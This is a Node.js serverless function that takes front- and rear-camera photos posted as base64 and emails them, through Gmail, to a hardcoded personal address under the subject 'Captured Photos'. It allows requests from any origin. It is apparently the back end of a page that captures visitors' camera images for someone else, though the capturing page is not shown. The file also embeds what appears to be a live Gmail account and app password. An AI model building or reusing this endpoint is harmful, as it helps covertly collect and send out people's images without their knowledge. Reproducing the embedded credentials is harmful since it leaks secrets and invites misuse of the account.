const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Ensure it's a POST request
  if (req.method === 'POST') {
    try {
      // Parse the body if it's a string
      let body = req.body;
      if (typeof body === 'string') {
        body = JSON.parse(body);
      }

      // Log the body to verify input
      console.log('Request Body:', body);

      // Extract rearPhoto and frontPhoto from the request
      const { rearPhoto, frontPhoto } = body;

      // Ensure both photos are provided
      if (!rearPhoto || !frontPhoto) {
        console.log('Missing photo data');
        return res.status(400).json({ success: false, message: 'Missing photo data' });
      }

      // Set up the transporter for sending the email
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'aleksadiscord1@gmail.com',
          pass: 'vamrkaxmpltrifsf', // Replace with your app password
        },
      });

      // Email options with both photos as attachments
      const mailOptions = {
        from: 'aleksadiscord1@gmail.com',
        to: 'aleksatomic2008@gmail.com',
        subject: 'Captured Photos',
        text: 'Here are the captured photos from rear and front cameras.',
        attachments: [
          {
            filename: 'rearPhoto.jpg',
            content: rearPhoto.split(';base64,')[1], // Extract base64 content
            encoding: 'base64',
          },
          {
            filename: 'frontPhoto.jpg',
            content: frontPhoto.split(';base64,')[1], // Extract base64 content
            encoding: 'base64',
          },
        ],
      };

      console.log('Sending email...');

      // Send the email
      await transporter.sendMail(mailOptions);
      console.log('Email sent successfully');
      return res.status(200).json({ success: true, message: 'Photos sent successfully!' });
    } catch (error) {
      console.error('Error processing request:', error);
      return res.status(500).json({ success: false, message: 'Internal server error', error: error.message });
    }
  } else {
    // Handle non-POST requests
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
};
